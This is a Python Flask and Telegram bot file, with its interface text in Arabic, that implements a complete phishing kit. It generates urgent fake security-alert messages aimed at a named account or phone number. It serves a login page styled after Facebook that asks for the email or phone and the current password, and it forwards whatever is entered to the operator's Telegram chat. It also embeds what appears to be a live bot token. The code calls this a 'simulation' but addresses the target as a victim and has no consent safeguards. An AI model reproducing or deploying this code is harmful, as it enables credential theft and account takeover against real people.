import os
import flask
import telebot
import requests

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9104150951:AAE4JjeM6FQvFyvRfyUnxCWAyNmtp9CDV7s").strip()
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = flask.Flask(__name__)

target_data = {
    "target_info": "Facebook_User",
    "chat_id": None
}

@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=['POST'])
def webhook():
    json_string = flask.request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    target_data["chat_id"] = message.chat.id
    welcome_text = (
        "مرحباً بك يا إسماعيل في نظام محاكاة الهجمات المتقدم. 🛡️\n\n"
        "أرسل الآن **اسم الحساب المستهدف أو رقم الهاتف**، وسيقوم البوت بتوليد رسالة التصيد المخصصة ورابط المحاكاة:"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def generate_phishing_payload(message):
    target_data["chat_id"] = message.chat.id
    target_input = message.text.strip()
    target_data["target_info"] = target_input
    
    render_url = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:10000")
    phishing_link = f"{render_url}/login"
    
    crafted_message = (
        f"⚠️ **إشعار أمني عاجل موجه إلى: {target_input}**\n\n"
        "تم رصد محاولة تسجيل دخول غير مسجلة على حسابك. يرجى تأكيده فوراً لتفادي التعليق الدائم:\n"
        f"🔗 {phishing_link}"
    )
    
    response_msg = (
        f"🎯 **تم تحليل الهدف وتوليد قالب الهجوم بنجاح!**\n\n"
        "📋 **الرسالة الجاهزة للإرسال:**\n"
        "------------------------------------\n"
        f"{crafted_message}\n"
        "------------------------------------\n\n"
        "⚡ *قم بنسخ هذه الرسالة ومحاكاة إرسالها للضحية، وبمجرد تفاعله ستصلك البيانات هنا.*"
    )
    bot.reply_to(message, response_msg, parse_mode="Markdown")

@app.route("/login")
def phishing_page():
    current_target = target_data["target_info"]
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول - تأكيد الحساب</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .container {{ background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }}
            h2 {{ color: #1877f2; margin-bottom: 5px; }}
            p {{ color: #606770; font-size: 13px; margin-bottom: 20px; }}
            input {{ width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 14px; }}
            button {{ width: 95%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
            button:hover {{ background: #166fe5; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>التحقق الأمني</h2>
            <p>جارٍ تأكيد الهوية لحساب: <b>{current_target}</b></p>
            <form action="/capture" method="POST">
                <input type="text" name="identity" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة المرور الحالية" required>
                <button type="submit">متابعة التحقق</button>
            </form>
        </div>
    </body>
    </html>
    """
    return html_content

@app.route("/capture", methods=['POST'])
def capture_data():
    identity = flask.request.form.get("identity")
    password = flask.request.form.get("password")
    target = target_data["target_info"]
    chat_id = target_data["chat_id"]
    
    alert_text = (
        "🚨 **تم التقاط بيانات المحاكاة بنجاح!**\n\n"
        f"👤 **الهدف المستهدف:** `{target}`\n"
        f"📧 **البيانات المُدخلة:** `{identity}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        "⚡ *تمت معالجة الطلب عبر السيرفر لحظياً.*"
    )
    
    if chat_id:
        send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(send_url, json={"chat_id": chat_id, "text": alert_text, "parse_mode": "Markdown"})
        
    return "<h2 style='color: green; text-align: center; margin-top: 100px;'>تم التحقق من الحساب بنجاح، شكراً لك.</h2>"

if __name__ == "__main__":
    RENDER_URL = os.getenv("RENDER_EXTERNAL_URL")
    if RENDER_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{TELEGRAM_BOT_TOKEN}")
        print(f"Webhook set to: {RENDER_URL}/{TELEGRAM_BOT_TOKEN}")
        
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
